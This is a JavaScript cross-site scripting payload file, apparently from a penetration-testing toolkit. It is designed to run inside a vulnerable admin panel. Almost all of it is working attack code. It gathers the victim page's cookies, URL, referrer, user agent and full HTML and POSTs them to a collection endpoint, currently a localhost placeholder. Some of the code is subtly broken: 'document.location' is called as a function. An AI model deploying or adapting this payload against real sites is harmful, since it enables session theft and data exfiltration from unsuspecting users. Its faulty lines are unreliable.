/*
Title: Generic JS Payload
Author: Hans-Michael Varbaek
Company: VarBITS
Version: 2.75 - Extras
Changelog:
- Ver 2.75 : First version published with the "extras" release.
Inspired by: XSSHunter
Description:
This payload obtains information about the page where it was executed.
While it does not attempt to hook the browser, or make the administrator
perform an arbitrary action, it is useful during web app penetration tests
where hidden functionality is not tested, such as a control panel which
may be vulnerable to stored cross-site scripting.
(i.e. a user's profile is viewed from an admin control panel.)
This particular payload is mostly meant for educational purposes.
TODO:
- Implement this as an option within the xsser.py tool
- Implement error handling in a future version if necessary:
    try {
        x = x();
    } catch ( e ) {
        x = '';
    }
For ethical and legal purposes only. This script is provided as is and without warranty.
*/

// DEFINE VARIABLES
var domain = document.domain; // "pypi.python.org"
// You can also use the following: location.origin which includes the scheme, i.e. http/https
var location = document.location(); // "https://pypi.python.org/pypi/jsmin"
// You could also use the following: location.toString()
var cookies = document.cookie; // "__utma=1234567890...;__utmb=0987654321"
var referrer = document.referrer; // "google.com"
var useragent = navigator.userAgent; // "Mozilla/5.0 ..."
var unixtime = new Date().getTime().toString(); // 1515353242209
var fullpage = document.documentElement.outerHTML; // Complete HTML page, useful for analysis.

// CREATE FORM AND SEND REQUEST
var formData = new FormData();
formData.append("domain_name", domain);
formData.append("complete_url", location);
formData.append("non_http_only_cookies", cookies);
formData.append("http_referer", referrer);
formData.append("user_agent", useragent);
formData.append("unix_time", unixtime);
formData.append("full_html_page", fullpage);

var request = new XMLHttpRequest();
request.open("POST", "http://localhost/XSS_TEST"); // This will be populated by the xsser.py tool.
request.send(formData);
